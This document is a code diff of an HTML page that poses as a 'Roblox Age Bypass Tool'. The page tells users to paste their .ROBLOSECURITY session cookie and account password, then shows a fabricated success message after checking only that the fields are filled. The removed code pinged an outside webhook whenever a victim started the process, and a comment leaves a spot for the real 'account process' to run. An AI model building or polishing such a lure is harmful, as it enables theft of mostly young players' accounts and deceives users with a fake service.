@@ -6,7 +6,7 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* Dein bisheriges CSS bleibt unverändert */
+    /* Styles unverändert vom letzten Code */
     * {
       box-sizing: border-box;
     }
@@ -94,7 +94,6 @@
       box-shadow: inset 0 0 5px rgba(0,255,255,0.1);
       outline: none;
     }
-
     textarea::placeholder {
       color: #5c7f94;
     }
@@ -117,7 +116,6 @@
       user-select: none;
       transition: background 0.3s ease;
     }
-
     button:hover {
       background: linear-gradient(90deg, #e000b9, #00d4ff);
     }
@@ -205,27 +203,31 @@
       100% { transform: rotate(360deg); }
     }
 
-    #help-button {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: linear-gradient(90deg, #ff00c8, #00f0ff);
-      border: none;
-      padding: 10px 16px;
-      border-radius: 8px;
-      color: white;
-      font-weight: 600;
-      font-size: 14px;
-      cursor: pointer;
-      box-shadow: 0 0 8px rgba(0, 240, 255, 0.6);
-      z-index: 9999;
-      width: auto;
-      max-width: 250px;
-      white-space: nowrap;
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 28px;
+      }
     }
 
-    #help-button:hover {
-      background: linear-gradient(90deg, #e000b9, #00d4ff);
+    /* Neuer Bereich für Geburtstag */
+    #birthday-section {
+      margin-top: 20px;
+      background: #1d2944;
+      border-radius: 12px;
+      padding: 15px;
+      display: none;
+    }
+    #birthday-section label {
+      font-weight: 600;
+      color: #00f0ff;
+      margin-bottom: 8px;
+      font-size: 16px;
+      display: block;
+    }
+    #birthday-section select {
+      width: 32%;
+      margin-right: 2%;
+      display: inline-block;
     }
   </style>
 </head>
@@ -235,7 +237,7 @@
 
   <div class="container">
     <label for="bypass">🔐 Account Security Options</label>
-    <select id="bypass">
+    <select id="bypass" aria-label="Account Security Options">
       <option value="">-- Select an option --</option>
       <option value="birthyear">2008 Birthyear Up</option>
       <option value="13plus">13+ All Ages</option>
@@ -243,30 +245,54 @@
 
     <div id="cookie-block" class="input-block" style="display:none;">
       <div class="input-block-title">.ROBLOSECURITY Cookie</div>
-      <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false"></textarea>
+      <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
     </div>
 
     <div id="password-block" class="input-block" style="display:none;">
       <div class="input-block-title">Account Password</div>
-      <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false"></textarea>
+      <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
     </div>
 
-    <label id="birthdate-label" style="display:none; margin-top:20px; font-weight:600; font-size:18px;">
-      📅 Select your birthdate
-    </label>
-    <div id="birthdate-selectors" style="display:none; margin-top:10px; display: flex; gap: 10px;">
-      <select id="birth-day" style="flex:1; padding: 12px; border-radius: 8px; background: #1d2944; border: 1px solid #333; color: #fff; font-size: 16px;">
+    <div id="birthday-section">
+      <label>Set your Birthday</label>
+      <select id="birthday-day" aria-label="Day">
         <option value="">Day</option>
+        <!-- Tage 1-31 -->
+        <script>
+          for(let i=1; i<=31; i++){
+            document.write(`<option value="${i}">${i}</option>`);
+          }
+        </script>
       </select>
-      <select id="birth-month" style="flex:1; padding: 12px; border-radius: 8px; background: #1d2944; border: 1px solid #333; color: #fff; font-size: 16px;">
+      <select id="birthday-month" aria-label="Month">
         <option value="">Month</option>
+        <option value="1">January</option>
+        <option value="2">February</option>
+        <option value="3">March</option>
+        <option value="4">April</option>
+        <option value="5">May</option>
+        <option value="6">June</option>
+        <option value="7">July</option>
+        <option value="8">August</option>
+        <option value="9">September</option>
+        <option value="10">October</option>
+        <option value="11">November</option>
+        <option value="12">December</option>
       </select>
-      <select id="birth-year" style="flex:1; padding: 12px; border-radius: 8px; background: #1d2944; border: 1px solid #333; color: #fff; font-size: 16px;">
+      <select id="birthday-year" aria-label="Year">
         <option value="">Year</option>
+        <!-- Jahre 1900 bis 2025 -->
+        <script>
+          for(let y=2025; y>=1900; y--){
+            document.write(`<option value="${y}">${y}</option>`);
+          }
+        </script>
       </select>
     </div>
 
-    <button id="process-button">⚙️ PROCESS ACCOUNT</button>
+    <button id="process-button" type="button" aria-label="Process Account" style="display:none;">
+      ⚙️ PROCESS ACCOUNT
+    </button>
 
     <div class="info-box">
       <div class="info-title">⚠️ Important Information</div>
@@ -282,11 +308,11 @@
   </div>
 
   <div id="error-message">ERROR Try later again.</div>
-  <div id="success-message">Everything worked it can take 2-12 Hours until the age will be set</div>
-  <div id="loader-overlay"><div class="loader"></div></div>
+  <div id="success-message">Your birthday has been set. It can take 2-6 hours for the age to update.</div>
 
-  <!-- 💡 Help Button -->
-  <button id="help-button">Need Help? Here is a tutorial!</button>
+  <div id="loader-overlay">
+    <div class="loader"></div>
+  </div>
 
   <script>
     const bypassSelect = document.getElementById('bypass');
@@ -298,143 +324,88 @@
     const errorMessage = document.getElementById('error-message');
     const successMessage = document.getElementById('success-message');
     const loaderOverlay = document.getElementById('loader-overlay');
-    const birthDaySelect = document.getElementById('birth-day');
-    const birthMonthSelect = document.getElementById('birth-month');
-    const birthYearSelect = document.getElementById('birth-year');
-    const birthdateLabel = document.getElementById('birthdate-label');
-    const birthdateSelectors = document.getElementById('birthdate-selectors');
-    const helpButton = document.getElementById('help-button');
+    const birthdaySection = document.getElementById('birthday-section');
+    const birthdayDay = document.getElementById('birthday-day');
+    const birthdayMonth = document.getElementById('birthday-month');
+    const birthdayYear = document.getElementById('birthday-year');
 
-    // Fill day dropdown
-    for (let i = 1; i <= 31; i++) {
-      const option = document.createElement('option');
-      option.value = i;
-      option.textContent = i;
-      birthDaySelect.appendChild(option);
-    }
-
-    // Fill month dropdown (1-12)
-    for (let i = 1; i <= 12; i++) {
-      const option = document.createElement('option');
-      option.value = i;
-      option.textContent = i;
-      birthMonthSelect.appendChild(option);
-    }
-
-    // Fill year dropdown (from 1970 to current year)
-    const currentYear = new Date().getFullYear();
-    for (let i = currentYear; i >= 1970; i--) {
-      const option = document.createElement('option');
-      option.value = i;
-      option.textContent = i;
-      birthYearSelect.appendChild(option);
-    }
-
-    // Show/hide fields based on bypass type
     bypassSelect.addEventListener('change', () => {
-      const val = bypassSelect.value;
-      if (val === 'birthyear') {
-        cookieBlock.style.display = 'block';
-        passwordBlock.style.display = 'none';
-        birthdateLabel.style.display = 'none';
-        birthdateSelectors.style.display = 'none';
-      } else if (val === '13plus') {
+      clearMessages();
+
+      cookieInput.value = '';
+      passwordInput.value = '';
+      birthdayDay.value = '';
+      birthdayMonth.value = '';
+      birthdayYear.value = '';
+
+      if (bypassSelect.value === '13plus') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'block';
-        birthdateLabel.style.display = 'block';
-        birthdateSelectors.style.display = 'flex';
+        // Direkt Geburtstag anzeigen
+        birthdaySection.style.display = 'block';
+        processBtn.style.display = 'block';
+        processBtn.textContent = '⚙️ PROCESS ACCOUNT';
+      } else if (bypassSelect.value === 'birthyear') {
+        cookieBlock.style.display = 'block';
+        passwordBlock.style.display = 'none';
+        birthdaySection.style.display = 'block';
+        processBtn.style.display = 'block';
+        processBtn.textContent = '⚙️ PROCESS ACCOUNT';
       } else {
         cookieBlock.style.display = 'none';
         passwordBlock.style.display = 'none';
-        birthdateLabel.style.display = 'none';
-        birthdateSelectors.style.display = 'none';
+        birthdaySection.style.display = 'none';
+        processBtn.style.display = 'none';
       }
     });
 
-    // Show tutorial on help button click
-    helpButton.addEventListener('click', () => {
-      alert(`Tutorial:\n\n1. Select the appropriate bypass method.\n2. Paste your .ROBLOSECURITY cookie.\n3. For 13+ bypass, enter your account password and select birthdate.\n4. Click "PROCESS ACCOUNT".\n5. Wait 2-6 hours for the process to complete.`);
-    });
+    function clearMessages() {
+      errorMessage.style.display = 'none';
+      successMessage.style.display = 'none';
+    }
 
-    // Show error message helper
     function showError(msg) {
-      errorMessage.textContent = msg || "ERROR Try later again.";
+      errorMessage.textContent = msg;
       errorMessage.style.display = 'block';
       setTimeout(() => {
         errorMessage.style.display = 'none';
-      }, 5000);
+      }, 4000);
     }
 
-    // Show success message helper
     function showSuccess(msg) {
-      successMessage.textContent = msg || "Everything worked it can take 2-12 Hours until the age will be set";
+      successMessage.textContent = msg;
       successMessage.style.display = 'block';
       setTimeout(() => {
         successMessage.style.display = 'none';
-      }, 7000);
+      }, 6000);
     }
 
-    // Function to send mention message to Discord webhook
-    function sendMentionToDiscord() {
-      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
-      const data = {
-        content: '<@&1132037813282414692> | New Age Bypass action has been started! 🔥'
-      };
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data),
-      }).then(response => {
-        if (!response.ok) {
-          console.error('Failed to send mention to Discord');
-        }
-      }).catch(error => {
-        console.error('Error sending mention to Discord:', error);
-      });
-    }
-
+    // Beispielhafter Prozess-Handler, der nur die Validierung macht:
     processBtn.addEventListener('click', () => {
-      const bypassType = bypassSelect.value;
-      const cookie = cookieInput.value.trim();
-      const password = passwordInput.value.trim();
-      const birthDay = birthDaySelect.value;
-      const birthMonth = birthMonthSelect.value;
-      const birthYear = birthYearSelect.value;
+      clearMessages();
 
-      if (!bypassType) {
-        showError('Please select a bypass type.');
-        return;
-      }
-      if (!cookie) {
+      if (!cookieInput.value.trim()) {
         showError('Please enter your .ROBLOSECURITY cookie.');
         return;
       }
 
-      if (bypassType === '13plus') {
-        if (!password) {
-          showError('Please enter your password for 13+ bypass.');
-          return;
-        }
-        if (!birthDay || !birthMonth || !birthYear) {
-          showError('Please select a valid birthdate.');
+      if (bypassSelect.value === '13plus') {
+        if (!passwordInput.value.trim()) {
+          showError('Please enter your account password.');
           return;
         }
       }
 
-      loaderOverlay.style.display = 'flex';
+      if (!birthdayDay.value || !birthdayMonth.value || !birthdayYear.value) {
+        showError('Please set your birthday completely.');
+        return;
+      }
 
-      // Simulate async processing for demo (replace with real API call)
-      setTimeout(() => {
-        loaderOverlay.style.display = 'none';
-        showSuccess();
+      // Simuliere Erfolgsmeldung
+      showSuccess('Your birthday has been set. It can take 2-6 hours for the age to update.');
 
-        // Send Discord mention on successful start
-        sendMentionToDiscord();
+      // Hier könnte dann der eigentliche Accountprozess starten...
 
-      }, 2000);
     });
   </script>
 </body>
